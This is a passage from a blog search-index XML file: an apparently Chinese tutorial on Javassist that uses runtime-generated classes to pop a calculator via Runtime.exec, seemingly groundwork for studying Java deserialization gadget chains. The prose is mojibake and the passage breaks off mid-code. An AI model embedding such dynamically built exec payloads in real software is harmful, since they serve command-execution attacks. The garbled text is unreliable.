<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JavassiståŠ¨æ€ç¼–ç¨‹</title>
      <link href="/2022/10/24/Javassist%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/"/>
      <url>/2022/10/24/Javassist%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="javassistä»‹ç»"><a href="#javassistä»‹ç»" class="headerlink" title="javassistä»‹ç»"></a>javassistä»‹ç»</h2><p><code>Javassist</code>æ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†æã€ç¼–è¾‘å’Œåˆ›å»ºJavaå­—èŠ‚ç çš„ç±»åº“ï¼ŒJava å­—èŠ‚ç å­˜å‚¨åœ¨ç§°ä¸ºç±»æ–‡ä»¶çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ã€‚æ¯ä¸ªç±»æ–‡ä»¶åŒ…å«ä¸€ä¸ª Java ç±»æˆ–æ¥å£ã€‚æ˜¯ç”±ä¸œäº¬å·¥ä¸šå¤§å­¦çš„æ•°å­¦å’Œè®¡ç®—æœºç§‘å­¦ç³»çš„ Shigeru Chiba ï¼ˆåƒå¶ æ»‹ï¼‰æ‰€åˆ›å»ºçš„ã€‚å…¶ä¸»è¦çš„ä¼˜ç‚¹ï¼Œåœ¨äºç®€å•ï¼Œè€Œä¸”å¿«é€Ÿã€‚ç›´æ¥ä½¿ç”¨javaç¼–ç çš„å½¢å¼ï¼Œè€Œä¸éœ€è¦äº†è§£è™šæ‹ŸæœºæŒ‡ä»¤ï¼Œå°±èƒ½<code>åŠ¨æ€æ”¹å˜ç±»çš„ç»“æ„ï¼Œæˆ–è€…åŠ¨æ€ç”Ÿæˆç±»ã€‚</code></p><p>å­¦ä¹ ä¸€ä¸‹javassistä¸»è¦çš„å‡ ä¸ªç±»</p><h2 id="javassistå‡ ä¸ªé‡è¦çš„ç±»"><a href="#javassistå‡ ä¸ªé‡è¦çš„ç±»" class="headerlink" title="javassistå‡ ä¸ªé‡è¦çš„ç±»"></a>javassistå‡ ä¸ªé‡è¦çš„ç±»</h2><p>ä¸‹é¢å…³äºç±»çš„èµ„æ–™åŸºæœ¬æ˜¯ç½‘ä¸Šcopyçš„</p><h3 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h3><p><code>ClassPool</code>ï¼šä¸€ä¸ªåŸºäºå“ˆå¸Œè¡¨ï¼ˆ<code>Hashtable</code>ï¼‰å®ç°çš„<code>CtClass</code>å¯¹è±¡å®¹å™¨ï¼Œå…¶ä¸­é”®åæ˜¯ç±»åç§°ï¼Œå€¼æ˜¯è¡¨ç¤ºè¯¥ç±»çš„<code>CtClass</code>å¯¹è±¡</p><p>å¸¸ç”¨æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ClassPool<span class="title function_">getDefault</span><span class="params">()</span>è¿”å›é»˜è®¤çš„ç±»æ± ã€‚æ¯”å¦‚ <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">ClassPath<span class="title function_">insertClassPath</span><span class="params">(String pathname)</span>åœ¨æœç´¢è·¯å¾„çš„å¼€å¤´æ’å…¥ç›®å½•æˆ–jarï¼ˆæˆ–zipï¼‰æ–‡ä»¶ã€‚</span><br><span class="line">  </span><br><span class="line">ClassPath<span class="title function_">insertClassPath</span><span class="params">(ClassPath cp)</span>ClassPathåœ¨æœç´¢è·¯å¾„çš„å¼€å¤´æ’å…¥ä¸€ä¸ªå¯¹è±¡ã€‚</span><br><span class="line">  </span><br><span class="line">java.lang.ClassLoader<span class="title function_">getClassLoader</span><span class="params">()</span>è·å–ç±»åŠ è½½å™¨</span><br><span class="line">  </span><br><span class="line">CtClass<span class="title function_">get</span><span class="params">(java.lang.String classname)</span>ä»æºä¸­è¯»å–ç±»æ–‡ä»¶ï¼Œå¹¶è¿”å›å¯¹CtClass è¡¨ç¤ºè¯¥ç±»æ–‡ä»¶çš„å¯¹è±¡çš„å¼•ç”¨ã€‚</span><br><span class="line">  </span><br><span class="line">ClassPath<span class="title function_">appendClassPath</span><span class="params">(ClassPath cp)</span> å°†ClassPathå¯¹è±¡é™„åŠ åˆ°æœç´¢è·¯å¾„çš„æœ«å°¾ã€‚</span><br><span class="line">  </span><br><span class="line">CtClass<span class="title function_">makeClass</span><span class="params">(java.lang.String classname)</span>  åˆ›å»ºä¸€ä¸ªæ–°çš„<span class="keyword">public</span>ç±»</span><br></pre></td></tr></table></figure><h3 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h3><p>CtClassï¼šè¡¨ç¤ºä¸€ä¸ªç±»ï¼Œä¸€ä¸ª<code>CtClass</code>(ç¼–è¯‘æ—¶ç±»ï¼‰å¯¹è±¡å¯ä»¥å¤„ç†ä¸€ä¸ª<code>class</code>æ–‡ä»¶,è¿™äº›CtClasså¯¹è±¡å¯ä»¥ä»ClassPoolè·å¾—ã€‚</p><p>ä¸€èˆ¬éƒ½æ˜¯å¯¹CtClassç±»å¯¹è±¡è¿›è¡Œæ“ä½œï¼Œæ¯”å¦‚æ·»åŠ æ–¹æ³•ï¼Œæ·»åŠ æˆå‘˜å±æ€§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;cc2.classdemo2&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¸¸ç”¨æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span><span class="title function_">setSuperclass</span><span class="params">(CtClass clazz)</span>æ›´æ”¹è¶…ç±»ï¼Œé™¤éæ­¤å¯¹è±¡è¡¨ç¤ºæ¥å£ã€‚</span><br><span class="line"></span><br><span class="line">java.lang.Class&lt;?&gt;toClass(java.lang.invoke.MethodHandles.Lookup lookup)</span><br><span class="line">å°†æ­¤ç±»è½¬æ¢ä¸ºjava.lang.Classå¯¹è±¡ã€‚</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[]toBytecode()å°†è¯¥ç±»è½¬æ¢ä¸ºç±»æ–‡ä»¶ã€‚</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span><span class="title function_">writeFile</span><span class="params">()</span>å°†ç”±æ­¤CtClass å¯¹è±¡è¡¨ç¤ºçš„ç±»æ–‡ä»¶å†™å…¥å½“å‰ç›®å½•ã€‚</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span><span class="title function_">writeFile</span><span class="params">(java.lang.String directoryName)</span> å°†ç”±æ­¤CtClass å¯¹è±¡è¡¨ç¤ºçš„ç±»æ–‡ä»¶å†™å…¥æœ¬åœ°ç£ç›˜ã€‚</span><br><span class="line"></span><br><span class="line">CtConstructor<span class="title function_">makeClassInitializer</span><span class="params">()</span>åˆ¶ä½œä¸€ä¸ªç©ºçš„ç±»åˆå§‹åŒ–ç¨‹åºï¼ˆé™æ€æ„é€ å‡½æ•°ï¼‰ã€‚</span><br></pre></td></tr></table></figure><h3 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h3><p>CtMethodï¼šè¡¨ç¤ºç±»ä¸­çš„æ–¹æ³•ã€‚è¶…ç±»ä¸ºCtBehaviorï¼Œå¾ˆå¤šæœ‰ç”¨çš„æ–¹æ³•éƒ½åœ¨CtBehavior</p><p><strong>ä¹Ÿå°±æ˜¯å…³äºæ·»åŠ æ–¹æ³•çš„ä¸€ç³»åˆ—æ“ä½œ</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span><span class="title function_">insertBefore</span> <span class="params">(java.lang.String src)</span></span><br><span class="line">åœ¨æ­£æ–‡çš„å¼€å¤´æ’å…¥å­—èŠ‚ç ã€‚</span><br><span class="line"><span class="keyword">void</span><span class="title function_">insertAfter</span><span class="params">(java.lang.String src)</span></span><br><span class="line">åœ¨æ­£æ–‡çš„æœ«å°¾æ’å…¥å­—èŠ‚ç ã€‚</span><br><span class="line"><span class="keyword">void</span><span class="title function_">setBody</span> <span class="params">(CtMethod src, ClassMap map)</span></span><br><span class="line">ä»å¦ä¸€ä¸ªæ–¹æ³•å¤åˆ¶æ–¹æ³•ä½“ã€‚</span><br></pre></td></tr></table></figure><h3 id="CtConstructor"><a href="#CtConstructor" class="headerlink" title="CtConstructor"></a>CtConstructor</h3><p>CtConstructorçš„å®ä¾‹è¡¨ç¤ºä¸€ä¸ªæ„é€ å‡½æ•°ã€‚å®ƒå¯èƒ½ä»£è¡¨ä¸€ä¸ªé™æ€æ„é€ å‡½æ•°ã€‚</p><p><strong>ä¹Ÿå°±æ˜¯åˆ›å»ºæœ‰å‚æˆ–è€…æ— å‚å‡½æ•°</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span><span class="title function_">setBody</span><span class="params">(java.lang.String src)</span></span><br><span class="line">è®¾ç½®æ„é€ å‡½æ•°ä¸»ä½“ã€‚</span><br><span class="line"><span class="keyword">void</span><span class="title function_">setBody</span><span class="params">(CtConstructor src, ClassMap map)</span></span><br><span class="line">ä»å¦ä¸€ä¸ªæ„é€ å‡½æ•°å¤åˆ¶ä¸€ä¸ªæ„é€ å‡½æ•°ä¸»ä½“ã€‚</span><br><span class="line">CtMethod<span class="title function_">toMethod</span><span class="params">(java.lang.String name, CtClass declaring)</span></span><br><span class="line">å¤åˆ¶æ­¤æ„é€ å‡½æ•°å¹¶å°†å…¶è½¬æ¢ä¸ºæ–¹æ³•ã€‚</span><br></pre></td></tr></table></figure><h3 id="ClassClassPath"><a href="#ClassClassPath" class="headerlink" title="ClassClassPath"></a>ClassClassPath</h3><p>å®šä¹‰åœ¨ java.lang.Class ä¸­è·å–ç±»æ–‡ä»¶çš„æœç´¢è·¯å¾„ã€‚</p><p>æ„é€ æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClassClassPath(java.lang.Class&lt;?&gt; c)</span><br><span class="line">åˆ›å»ºä¸€ä¸ªæœç´¢è·¯å¾„ã€‚</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ä¸‹é¢çš„ä»£ç ï¼Œæ˜¯åœ¨é»˜è®¤ç³»ç»Ÿæœç´¢è·¯å¾„è·å–demoå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="comment">// è·å–ç›®æ ‡ç±» cc2.demo</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;cc2.demo&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>insertClassPath</code>ä¿®æ”¹è¿™ä¸ªæœç´¢è·¯å¾„</p><p>å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(test_javassist3.class.getClass()));</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;cc1.cc1_test&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="åŠŸèƒ½ä¸€ï¼šåŠ¨æ€ç”Ÿæˆç±»"><a href="#åŠŸèƒ½ä¸€ï¼šåŠ¨æ€ç”Ÿæˆç±»" class="headerlink" title="åŠŸèƒ½ä¸€ï¼šåŠ¨æ€ç”Ÿæˆç±»"></a>åŠŸèƒ½ä¸€ï¼šåŠ¨æ€ç”Ÿæˆç±»</h2><p><code>ä¹Ÿå°±æ˜¯é€šè¿‡javassistä¸Šé¢çš„å‡ ä¸ªç±»ä»¥åŠå¯¹åº”çš„æ–¹æ³•å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„çš„ç±»ï¼Œå…¶ä¸­çš„æ–¹æ³•ï¼Œå±æ€§ï¼Œæ¥å£ç­‰ç­‰æˆ‘ä»¬éƒ½å¯ä»¥è‡ªå·±å®šä¹‰</code></p><p>åŠ¨æ€ç”Ÿæˆç±»éœ€è¦ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼ˆé‡ç‚¹ä¸ºå‰3æ­¥æˆ–è€…å‰4æ­¥ï¼‰</p><ol><li>è·å–é»˜è®¤ç±»æ± <code>ClassPool classPool = ClassPool.getDefault();</code></li><li>åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰ç±»<code>CtClass ctClass = classPool.makeClass();</code></li><li>æ·»åŠ å®ç°æ¥å£&#x2F;å±æ€§&#x2F;æ„é€ æ–¹æ³•&#x2F;æ™®é€šæ–¹æ³•</li><li>å†™å…¥ç£ç›˜</li><li>è¿›è¡ŒéªŒè¯ï¼ˆä¹Ÿå°±æ˜¯è°ƒç”¨è¯¥ç±»çš„æ–¹æ³•ï¼‰</li></ol><p>ç®€å•çš„åŠ¨æ€ç”Ÿæˆä¸€ä¸ªå«æœ‰calcmethod(å¼¹è®¡ç®—å™¨)æ–¹æ³•çš„ç±»classdemo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javafx.util.converter.LocalDateStringConverter;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test_javassist</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="comment">// 1. è·å–é»˜è®¤ç±»æ± </span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 2. åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰ç±»classdemo</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;cc2.classdemo&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. æ·»åŠ ä¸€ä¸ªæ–¹æ³•</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void calcmethod()&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>,ctClass);</span><br><span class="line">        <span class="comment">// å°†è¯¥æ–¹æ³•æ·»åŠ ç»™ctClass</span></span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. å†™å…¥ç£ç›˜</span></span><br><span class="line">        <span class="comment">// è½¬æ¢ä¸ºå­—èŠ‚æµ</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="comment">// ä½¿ç”¨writefileæŒ‡å®šç»å¯¹è·¯å¾„å†™å…¥ç£ç›˜</span></span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;D:\\projects\\java\\java1\\src\\main\\java&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. éªŒè¯</span></span><br><span class="line">        <span class="comment">// è°ƒç”¨classdemoçš„æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// è·å–javassistçš„Classloader</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Loader</span>(classPool);</span><br><span class="line">        <span class="comment">// åŠ è½½è¯¥classæ–‡ä»¶</span></span><br><span class="line">        Class&lt;?&gt; aClass = loader.loadClass(<span class="string">&quot;cc2.classdemo&quot;</span>);</span><br><span class="line">        <span class="comment">// è°ƒç”¨è¯¥æ–¹æ³•</span></span><br><span class="line">        aClass.getDeclaredMethod(<span class="string">&quot;calcmethod&quot;</span>).invoke(aClass.newInstance());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p>åœ¨æŒ‡å®šç›®å½•ä¸‹ç”Ÿæˆclassdemo.class</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221023231659650.png" alt="image-20221023231659650"></p><p>å¹¶ä¸”åŠ è½½è¯¥ç±»å¹¶è°ƒç”¨calcmethodæ–¹æ³•æˆåŠŸ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221023231453520.png" alt="image-20221023231453520"></p><p>ç„¶åæ›´åŠ ä¸°å¯Œä¸€ç‚¹ï¼Œåœ¨è¿™ä¸ªåŸºç¡€ä¸Šæ·»åŠ æ¥å£ï¼Œå±æ€§ç­‰ç­‰</p><p>æ¯”å¦‚ä¸‹é¢è¿™ä¸ªï¼Œæˆ‘ä»¬æ–°å»ºäº†ä¸€ä¸ªclassdemo2.classï¼Œå®ç°äº†<code>Serializableæ¥å£</code>ï¼Œæ–°å¢äº†idå’Œnameå±æ€§ï¼Œæ–°å¢äº†æ— å‚å’Œæœ‰å‚æ„é€ æ–¹æ³•ï¼Œå¹¶ä¸”é€šè¿‡å®ä¾‹åŒ–ï¼Œåå°„è°ƒç”¨getnameå’Œgetidæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> javassist.bytecode.AccessFlag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test_javassist</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NotFoundException &#123;</span><br><span class="line"><span class="comment">//        è·å–é»˜è®¤ç±»æ± </span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰ç±»classdemo</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;cc2.classdemo2&quot;</span>);</span><br><span class="line">        <span class="comment">// å®ç°åºåˆ—åŒ–æ¥å£</span></span><br><span class="line">        ctClass.setInterfaces(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;classPool.makeInterface(<span class="string">&quot;java.io.Serializable&quot;</span>)&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ·»åŠ ä¸€ä¸ªintç±»å‹çš„æˆå‘˜å˜é‡</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType, <span class="string">&quot;id&quot;</span>, ctClass);</span><br><span class="line">        id.setModifiers(AccessFlag.PUBLIC);</span><br><span class="line">        ctClass.addField(id);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ·»åŠ ä¸€ä¸ªStringç±»å‹çš„æˆå‘˜å˜é‡</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(classPool.get(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;name&quot;</span>, ctClass);</span><br><span class="line">        <span class="comment">// å°†idè®¾ç½®ä¸ºpublic</span></span><br><span class="line">        name.setModifiers(AccessFlag.PUBLIC);</span><br><span class="line">        <span class="comment">// å°†è¯¥nameå±æ€§æ·»åŠ ç»™atClass</span></span><br><span class="line">        ctClass.addField(name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ·»åŠ æ— å‚æ„é€ æ–¹æ³•</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor1</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public classdemo2()&#123;&#125;;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addConstructor(ctConstructor1);</span><br><span class="line">        <span class="comment">//æ·»åŠ æœ‰å‚æ„é€ æ–¹æ³•</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public classdemo2(int id,String name)&#123;this.id = id;this.name=name;&#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addConstructor(ctConstructor);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ·»åŠ ä¸€ä¸ªæ–¹æ³•</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void calcmethod()&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>,ctClass);</span><br><span class="line">        <span class="comment">// å°†è¯¥æ–¹æ³•æ·»åŠ ç»™ctClass</span></span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ·»åŠ getç±»æ–¹æ³•</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">getid_method</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public int getid()&#123;return this.id;&#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addMethod(getid_method);</span><br><span class="line">        <span class="comment">//æ·»åŠ getç±»æ–¹æ³•</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">getname_method</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public String getname()&#123;return this.name;&#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addMethod(getname_method);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å†™å…¥ç£ç›˜</span></span><br><span class="line">        <span class="comment">// è½¬æ¢ä¸ºå­—èŠ‚æµ</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="comment">// æ–¹æ³•ä¸€ï¼šä½¿ç”¨writefileæŒ‡å®šç»å¯¹è·¯å¾„å†™å…¥ç£ç›˜</span></span><br><span class="line"><span class="comment">//        ctClass.writeFile(&quot;D:\\projects\\java\\java1\\src\\main\\java&quot;);</span></span><br><span class="line">        <span class="comment">// æ–¹æ³•äºŒï¼šä½¿ç”¨FileOutputStreamå†™å…¥ç£ç›˜</span></span><br><span class="line">        <span class="comment">// System.getProperties(&quot;user.dir&quot;) å®šä½åˆ°çš„å½“å‰ç”¨æˆ·ç›®å½•(&quot;user.dir&quot;)ï¼ˆå³å·¥ç¨‹æ ¹ç›®å½•ï¼‰</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;user.dir&quot;</span>), <span class="string">&quot;/src/main/java/cc2/&quot;</span>),<span class="string">&quot;classdemo2.class&quot;</span>);   <span class="comment">// è¿™ä¸ªå’Œä¸Šé¢çš„makeä¸åŒï¼Œè¿™é‡Œæ˜¯ç±»çš„ä½ç½®ä»¥åŠæ–‡ä»¶å</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        fileOutputStream.write(bytes);</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// éªŒè¯</span></span><br><span class="line">        <span class="comment">// è°ƒç”¨classdemoçš„æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// è·å–javassistçš„Classloader</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Loader</span>(classPool);</span><br><span class="line">        <span class="comment">// åŠ è½½è¯¥classæ–‡ä»¶</span></span><br><span class="line">        Class&lt;?&gt; aClass = loader.loadClass(<span class="string">&quot;cc2.classdemo2&quot;</span>);</span><br><span class="line">        <span class="comment">// é€šè¿‡æ— å‚æ„é€ åˆ›å»ºå¯¹è±¡,åå°„è°ƒç”¨è¯¥æ–¹æ³•</span></span><br><span class="line"><span class="comment">//        aClass.getDeclaredMethod(&quot;calcmethod&quot;).invoke(aClass.newInstance());</span></span><br><span class="line">        <span class="comment">//é€šè¿‡æœ‰å‚æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡ï¼Œåå°„è°ƒç”¨è¯¥æ–¹æ³•</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getConstructor(<span class="type">int</span>.class, String.class);</span><br><span class="line">        <span class="comment">//åˆ›å»ºå¯¹è±¡</span></span><br><span class="line">        <span 